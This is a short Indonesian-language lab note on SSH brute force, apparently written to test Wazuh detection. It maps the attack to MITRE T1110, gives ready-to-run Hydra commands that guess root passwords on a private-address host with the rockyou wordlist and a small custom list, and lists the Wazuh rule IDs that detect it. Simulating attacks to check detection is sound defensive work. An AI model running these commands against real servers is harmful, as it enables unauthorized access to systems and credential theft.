# SSH Brute Force Attack

## Deskripsi
Brute Force mencoba kombinasi username/password secara masif
untuk mendapatkan akses SSH ke server korban.

## MITRE ATT&CK
- Tactic: Credential Access
- Technique: T1110 — Brute Force

## Attack Commands
```bash
# Menggunakan Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.217.130 -t 4 -V -f

# Menggunakan wordlist custom
cat > /tmp/pass_test.txt << 'PASS'
123456
password
root
admin
toor
PASS

hydra -l root -P /tmp/pass_test.txt ssh://192.168.217.130 -t 4 -V
```

## Detection
- Rule ID: 5551 (Wazuh Built-in — PAM Multiple failures)
- Rule ID: 40111 (Wazuh Built-in — Multiple auth failures)
- Rule ID: 100002 (Custom — SSH Brute Force)
- Level: 10-12
